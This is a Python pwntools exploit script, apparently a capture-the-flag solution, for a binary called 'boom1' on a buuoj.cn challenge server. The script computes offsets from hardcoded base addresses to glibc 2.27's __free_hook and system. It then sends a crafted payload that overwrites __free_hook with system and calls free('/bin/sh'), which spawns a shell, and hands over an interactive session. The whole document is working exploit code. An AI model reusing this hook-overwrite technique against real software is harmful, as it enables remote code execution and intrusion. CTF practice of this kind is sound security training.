'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
'''

from pwn import *


local = 0
url, port = "node5.buuoj.cn", 29791
filename = "./boom1"
elf = ELF(filename)
local_libc = '/home/fa1c4/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc-2.27.so'
remote_libc = './ubuntu18-libc-2.27-x64.so'
libc = ELF(local_libc if local else remote_libc) # 2.23-0ubuntu11.3
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    # context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

def B():
    gdb.attach(io)
    pause()

local_base = 0x517fd8
remote_base = 0x54dfd8
base_addr = local_base if local else remote_base
offset_free_hook = (base_addr - libc.sym['__free_hook']) // 8
offset_system = (base_addr - libc.sym['system']) // 8

def pwn():
    payload = 'main(){int a; *(&a -' + str(offset_free_hook) + ') = &a - ' + str(offset_system) + ';free("/bin/sh");}\n'
    io.sendafter(b"I\'m living...\n", payload.encode())


if __name__ == "__main__":
    pwn()
    io.interactive()
